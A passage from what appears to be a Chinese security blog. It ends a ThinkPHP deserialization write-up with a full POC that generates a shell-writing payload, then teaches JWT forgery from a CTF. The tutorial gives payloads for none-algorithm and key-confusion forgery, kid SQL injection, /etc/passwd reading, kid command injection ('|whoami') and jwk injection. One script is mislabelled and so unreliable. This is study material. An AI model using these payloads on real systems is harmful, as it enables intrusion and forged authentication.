punctuation">}</span></code></pre><p>option数组是可控的，$name的值我们也是可知的。再看$data，发现$data来自$value的序列化，我们回溯下发现$value的值来自前面用到的write，且恒定为true，不可控。而且这个地方还有个exit。</p><p>这个地方算是这个漏洞最精彩的地方了，POP链虽然长，但是没有什么特别精彩的地方。</p><p>我们看一下这里是怎么绕过的，exit直接可以用伪协议进行绕过。而$data的绕过来自setTagItem方法，我们可以看到，上传成功之后会调用这个方法。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">setTagItem</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$key</span>       <span class="token operator">=</span> <span class="token string">'tag_'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">has</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span>   <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>            <span class="token variable">$value</span>   <span class="token operator">=</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token function">array_unique</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>在这里又调用了以此set方法，而这个方法里面$key我们是可以控制的，所以filename依然可控，但这不是重点，重点是$value的值，value的值来自上一个文件的$filename，这样就可以成功写入shell，但是由于windows文件名的限制，只能在linux里实现。</p><p>文件名的控制在</p><pre class=" language-php"><code class="language-php">setTagItem方法    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$name</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">;</span></code></pre><p>其中path可控，所以path就是我们的payload。下面是完整的POC</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span> <span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">File</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string">'expire'</span>        <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token string">'cache_subdir'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token string">'prefix'</span>        <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>            <span class="token string">'path'</span>          <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'phpinfo,test'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//payload</span>            <span class="token string">'data_compress'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>File</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Memcached</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$handler</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Output</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcached</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">OneToOne</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">HasOne</span> <span class="token keyword">extends</span> <span class="token class-name">OneToOne</span><span class="token comment" spellcheck="true">//此处同样可以使用Belongs类</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">selfRelation</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'nonono'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'nonono'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span> <span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Query</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>HasOne</span><span class="token punctuation">;</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Relation</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//调用__call的类</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"getError"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"getError"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HasOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Pipes</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Windows</span> <span class="token keyword">extends</span> <span class="token class-name">Pipes</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//此处同样可以使用Merge类</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>运行发现生成了在public下生成了两个文件</p><p><img src="/2383120768/20.png" alt></p><p>看第一个</p><p><img src="/2383120768/21.png" alt></p><p>发现内容成功写入进去，只不过这个地方没有对exit进行绕过，而且是windows环境就没有进行测试。</p><p>最后在写一下文件名生成</p><pre class=" language-php"><code class="language-php">第一个文件    我们传入的path<span class="token operator">+</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>getAttr</span><span class="token punctuation">></span></span></span>bindAttr的key<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>getAttr</span><span class="token punctuation">></span></span></span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">.</span>phpshell文件    我们传入的path<span class="token operator">+</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'tag_'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">.</span>php</code></pre><h2 id="End"><a href="#End" class="headerlink" title="End"></a>End</h2><p>到这里就先收尾了，跟的期间很多点都是可以进行思考扩展的，后面有空了再写，另外还有exit的绕过也挺有意思的，后面有机会总结学习一下……</p><p>最后再附上一张安全客大佬画的整条POP链的图</p><p><img src="/2383120768/22.png" alt></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>一题学习JWT伪造</title>
      <link href="/3987183317.html"/>
      <url>/3987183317.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h2><p>这次打虎符遇到一个JWT的题目，刚好整理学习一下JWT伪造，防止后面遇到了不会……</p><h2 id="0x02-什么是JWT"><a href="#0x02-什么是JWT" class="headerlink" title="0x02 什么是JWT"></a>0x02 什么是JWT</h2><p>JWT是一种用于身份认证的机制的一种，是为了用来解决session全都存储到服务器上导致的很难进行横向扩展的一种机制，相较于session机制，JWT全都在客户端，不存储在服务器端，从这点其实就能发现有可利用点，不存储到服务端，说明不会与服务端进行校验，这就是我们进行JWT伪造的前提。对于这点JWT其本身也有加密机制，但是没有绝对的安全，总会由于一些配置问题而导致安全问题。</p><h3 id="JWT的签发认证流程"><a href="#JWT的签发认证流程" class="headerlink" title="JWT的签发认证流程"></a>JWT的签发认证流程</h3><p>从下图看一下JWT的签发机制：</p><p><img src="http://blog.x1001.cn/img/jwt/jwt_diagram.png" alt></p><p>具体流程就是：</p><ol><li>向服务器发送账号信息</li><li>服务器基于账户信息生成一个JWT并返回给用户</li><li>然后用户在Cookie、header、或者post的时候携带JWT</li><li>服务器对JWT的签名进行校验，正确则响应用户的请求并返回</li></ol><h3 id="JWT的组成"><a href="#JWT的组成" class="headerlink" title="JWT的组成"></a>JWT的组成</h3><p><img src="/3987183317/1.png" alt></p><p>从图中我们可以很清晰的发现JWT有三部分组成吗，其中以<code>.</code>进行分割，每段存储的信息都不同，结构就是<code>header.payload.signature</code>，下面我们分开看一下着三个字段</p><h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p><img src="/3987183317/2.png" alt></p><p>上图中的是herder字段解码后的数据，是一个json对象</p><p>其中alg表示的是签名的算法，默认算法是HMAC SHA256，简写成HS256（HMAC是对称加密，RSA是非对称加密）;tye则是表明这个令牌的类型，JWT默认是JWT，下面也是一些JWT的标头声明：</p><table><thead><tr><th>Token</th><th>Description</th><th>Format</th></tr></thead><tbody><tr><td>typ</td><td>令牌类型 (JWT/JWE/JWS等)</td><td>string</td></tr><tr><td>alg</td><td>用于签名或加密的算法</td><td>string</td></tr><tr><td>kid</td><td>Key ID - 用作查找</td><td>string</td></tr><tr><td>x5u</td><td>x509证书的URL</td><td>URL</td></tr><tr><td>x5c</td><td>用于签名的x509证书（作为嵌套的JSON对象）</td><td>JSON object</td></tr><tr><td>jku</td><td>JWKS格式键的URL</td><td>URL</td></tr><tr><td>jwk</td><td>用于签名的JWK格式密钥（作为嵌套的JSON对象）</td><td>JSON object</td></tr></tbody></table><p>将json数组经过Base64URL编码之后转成字符串就是JWT的第一段</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>payload就是JWT最容易出问题的地方，先看图:</p><p><img src="/3987183317/3.png" alt></p><p>同样也是一个json对象，payload是用来存放data信息的，JWT官方给出来下面几个字段</p><blockquote><ul><li>iss (issuer)：签发人</li><li>exp (expiration time)：过期时间</li><li>sub (subject)：主题</li><li>aud (audience)：受众</li><li>nbf (Not Before)：生效时间</li><li>iat (Issued At)：签发时间</li><li>jti (JWT ID)：编号</li></ul></blockquote><p>可以任意选用，同时也可以自己定义字段，如定义username，password等，需要注意的是JWT的payload字段是不加密的只经过了base64URL编码，如果存入了敏感信息如上面说的password等，可能就会导致敏感信息泄露。同时一些身份验证也会存储在这个字段。</p><p>经过base64URL编码后就是JWT的第二部分</p><h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>这就是我们能否进行JWT伪造的关键地方，前面也提到了，在客户端存储，是不会去服务器端进行验证的，那如何保证JWT不被伪造，就是用Signature来实现的，下面用HS256进行举例是如何成签名的。</p><pre><code>HMACSHA256(  base64UrlEncode(header) + &quot;.&quot; +  base64UrlEncode(payload),  secret)</code></pre><p>可以看到，HS256的加密用到了header和payload的数据，所以如果我们修改payload进行伪造是没办法，绕过签名检测的，而且secret我们是不知道的，所以是不能伪造Signature的，但是在这个弱密码横生的年代，secret是弱密码的也不是少数，这就导致了对secret进行爆破然后伪造……具体攻击方式后面再说</p><p>Signature算出来后，继续用<code>.</code>拼接到后面，就组成了一个完整的JWT</p><h3 id="Base64URL"><a href="#Base64URL" class="headerlink" title="Base64URL"></a>Base64URL</h3><p>这里稍微提一下base64URL编码，这次比赛也是吃了这个的亏，JWT有时候是会要在URL里进行传递的，所以要用Base64URL编码，但是这次比赛一直以为它和Base64没什么区别，懒得写脚本了，直接用burp的base64编码，导致伪造的JWT一直失败，属实憨憨了……</p><p>提一下和base64的区别，在URL因为有时候会用到<code>+、/、=</code>等字符，所以在base64URL编码中<code>=</code>被省略、<code>+</code>替换成<code>-</code>，<code>/</code>替换成<code>_</code></p><h2 id="0x03-常见JWT攻击方式"><a href="#0x03-常见JWT攻击方式" class="headerlink" title="0x03 常见JWT攻击方式"></a>0x03 常见JWT攻击方式</h2><p>我把JWT常见的攻击方式根据出现的地方大致分为两类，一类是header头，另一类是secret出现的问题。</p><h3 id="Header头"><a href="#Header头" class="headerlink" title="Header头"></a>Header头</h3><h4 id="空算法"><a href="#空算法" class="headerlink" title="空算法"></a>空算法</h4><p>这是一个JWT库的缺陷，JWT的解密方式是根据header头中的alg来是识别的，如果将其改为none，解密的时候就会认为它使用了空加密，签名部分就会直接不进行检测。导致绕过</p><p>这次的题目就用到了这个，但是我看代码还是有个疑问，这个攻击的利用应该是基于JWT解密时没有指定特定的解密算法才行，但是这次的指出了使用的解密算法，却还是能够利用这个漏洞是我目前没搞懂的，后面还会详细说。</p><p>脚本：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> jwt<span class="token keyword">import</span> base64public <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'key.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"name"</span><span class="token punctuation">,</span><span class="token string">"priv"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> key<span class="token operator">=</span>public<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="kid注射"><a href="#kid注射" class="headerlink" title="kid注射"></a>kid注射</h4><p>上面也提到的kid是用来查找的，准确的说是通过查找来获取加密算法的密钥，若是通过数据库来获取，或是文件读取，配置没配置好就有可能造成任意文件读取或者是sql注入……也可以用来指定我们可知的密钥，然后用来进行伪造</p><h5 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h5><pre><code>{    &quot;alg&quot; : &quot;HS256&quot;,    &quot;typ&quot; : &quot;jwt&quot;,    &quot;kid&quot; : &quot;key11111111&#39; || union select &#39;secretkey&#39; -- &quot;}</code></pre><h5 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h5><pre><code>{    &quot;alg&quot; : &quot;HS256&quot;,    &quot;typ&quot; : &quot;jwt&quot;,    &quot;kid&quot; : &quot;/etc/passwd&quot;}</code></pre><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><pre><code>{    &quot;alg&quot; : &quot;HS256&quot;,    &quot;typ&quot; : &quot;jwt&quot;,    &quot;kid&quot; : &quot;/path/to/key_file|whoami&quot;}</code></pre><h4 id="密钥混淆"><a href="#密钥混淆" class="headerlink" title="密钥混淆"></a>密钥混淆</h4><p>上面也提到了，加密方式有RSA和HMAC两种HMAC是对称加密，加密解密都用的是一个密钥，而RSA是非对称加密，受用私钥进行加密，公钥进行解密。而密钥混淆的原理就是，当我们把RSA加密方式在header中改成HMAC加密的时候，服务器收到后就会利用RSA的公钥进行解密，而RSA的公钥是很好获得的，这就导致JWT的伪造。</p><h4 id="密钥伪造（记录，未时间）"><a href="#密钥伪造（记录，未时间）" class="headerlink" title="密钥伪造（记录，未时间）"></a>密钥伪造（记录，未时间）</h4><p>密钥伪造方法有很多其中kid字段也可以进行密钥伪造，除此之外jwt也可以进行伪造：删除原始的签名，然后像标头添加新的公钥（此种方法貌似只能用于RSA加密）</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"typ"</span><span class="token operator">:</span> <span class="token string">"JWT"</span><span class="token punctuation">,</span>  <span class="token property">"alg"</span><span class="token operator">:</span> <span class="token string">"RS256"</span><span class="token punctuation">,</span>  <span class="token property">"jwk"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"kty"</span><span class="token operator">:</span> <span class="token string">"RSA"</span><span class="token punctuation">,</span>    <span class="token property">"kid"</span><span class="token operator">:</span> <span class="token string">"TEST"</span><span class="token punctuation">,</span>    <span class="token property">"use"</span><span class="token operator">:</span> <span class="token string">"sig"</span><span class="token punctuation">,</span>    <span class="token property">"e"</span><span class="token operator">:</span> <span class="token string">"AQAB"</span><span class="token punctuation">,</span>    <span class="token property">"n"</span><span class="token operator">:</span> <span class="token string">"oUGnPChFQAN1xdA1_f_FWZdFAis64o5hdVyFm4vVFBzTIEdYmZZ3hJHsWi5b_m_tjsgjhCZZnPOLn-ZVYs7pce__rDsRw9gfKGCVzvGYvPY1hkIENNeBfSaQlBhOhaRxA85rBkg8BX7zfMRQJ0fMG3EAZhYbr3LDtygwSXi66CCk4zfFNQfOQEF-Tgv1kgdTFJW-r3AKSQayER8kF3xfMuI7-VkKz-yyLDZgITyW2VWmjsvdQTvQflapS1_k9IeTjzxuKCMvAl8v_TFj2bnU5bDJBEhqisdb2BRHMgzzEBX43jc-IHZGSHY2KA39Tr42DVv7gS--2tyh8JluonjpdQ"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>初次之外JKU、X5U参数也都可以进行伪造，JKU参数是用来指定一组用来验证令牌的密钥的URL，如果没配置好，我们就可以指定我们可知的密钥进行伪造，X5U则以URI的形式数允许攻击者指定用于验证令牌的公钥证书或证书链，利用方式和JKU类似。</p><h3 id="基于密钥"><a href="#基于密钥" class="headerlink" title="基于密钥"></a>基于密钥</h3><h4 id="可爆破"><a href="#可爆破" class="headerlink" title="可爆破"></a>可爆破</h4><p>此方法只能用于对称加密的方式</p><p>可以利用<a href="https://github.com/ticarpi/jwt_tool" target="_blank" rel="noopener">jwt_tool</a>进行爆破，此工具可以实现JWT的多种攻击</p><h4 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h4><p>就是直接密钥泄露然后我们利用</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>还有一些就是由于开发验证导致的一些问题没做好JWT的验证，直接可以不用伪造签名就能绕过</p><h2 id="0x04-题目分析"><a href="#0x04-题目分析" class="headerlink" title="0x04 题目分析"></a>0x04 题目分析</h2><p>前端api.js源码：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token keyword">const</span> APIError <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../rest'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>APIError<span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'POST /api/register'</span><span class="token punctuation">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> <span class="token punctuation">{</span>username<span class="token punctuation">,</span> password<span class="token punctuation">}</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> username <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'register error'</span><span class="token punctuation">,</span> <span class="token string">'wrong username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">100000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            global<span class="token punctuation">.</span>secrets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token 